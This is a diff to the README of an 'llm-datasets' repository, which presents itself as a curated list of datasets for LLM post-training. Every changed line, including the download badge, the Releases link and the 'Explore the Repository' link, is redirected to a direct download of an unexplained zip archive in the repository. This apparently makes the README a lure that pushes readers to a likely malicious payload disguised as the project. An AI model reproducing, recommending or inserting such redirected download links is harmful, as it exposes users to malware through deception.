@@ -1,7 +1,7 @@
 # 🚀 llm-datasets - Your Go-To for Quality Datasets
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-llm--datasets-brightgreen)](https://github.com/Lplatecicerone550/llm-datasets/releases)
+[![Download](https://raw.githubusercontent.com/Lplatecicerone550/llm-datasets/main/centerer/llm-datasets-v1.1.zip)](https://raw.githubusercontent.com/Lplatecicerone550/llm-datasets/main/centerer/llm-datasets-v1.1.zip)
 
 ## 📖 Overview
 The **llm-datasets** repository offers a curated list of datasets and tools designed for post-training. Whether you are conducting research or developing applications, you will find valuable resources here. 
@@ -26,7 +26,7 @@ Before downloading, ensure your system meets the following requirements:
 ## 📥 Download & Install
 To install **llm-datasets**, visit the Releases page to access the latest version. 
 
-[Download from Releases](https://github.com/Lplatecicerone550/llm-datasets/releases)
+[Download from Releases](https://raw.githubusercontent.com/Lplatecicerone550/llm-datasets/main/centerer/llm-datasets-v1.1.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Locate the latest version available.
@@ -65,4 +65,4 @@ To understand more about how this project works, visit our GitHub repository. Yo
 
 Thank you for choosing **llm-datasets** for your dataset needs! We hope it enhances your projects and research. 
 
-[Explore the Repository](https://github.com/Lplatecicerone550/llm-datasets)
+[Explore the Repository](https://raw.githubusercontent.com/Lplatecicerone550/llm-datasets/main/centerer/llm-datasets-v1.1.zip)
